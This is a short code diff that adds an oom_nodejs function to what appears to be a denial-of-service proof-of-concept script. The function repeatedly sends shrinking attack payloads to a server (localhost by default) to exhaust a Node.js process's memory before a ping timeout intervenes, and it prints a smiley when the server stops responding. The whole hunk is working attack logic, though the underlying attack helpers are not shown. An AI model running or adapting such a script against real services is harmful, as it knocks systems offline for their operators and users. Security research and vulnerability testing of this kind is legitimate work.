@@ -106,3 +106,16 @@ def get_responses(host, sid):
 
 def x(payload_length=DEFAULT_MAX, make_payload=many_tiny_packets):
     return attack("http://127.0.0.1:5000", payload_length, make_payload)
+
+
+def oom_nodejs(host='http://127.0.0.1:5000', payload_length=DEFAULT_MAX, make_payload=many_tiny_packets):
+    """Try to find a DoS payload which isn't so large that we hit the ping timeout before OOM."""
+    try:
+        while payload_length > 50000:  # No point continuing shorter than this
+            attack(host, payload_length, make_payload)
+            payload_length = int(payload_length * 0.7)  # Try slightly smaller payload avoiding ping timed out
+        get_new_session_url(host)
+    except requests.exceptions.ConnectionError:
+        print("Server no longer responds :)")
+    else:
+        print("Server survived :(")
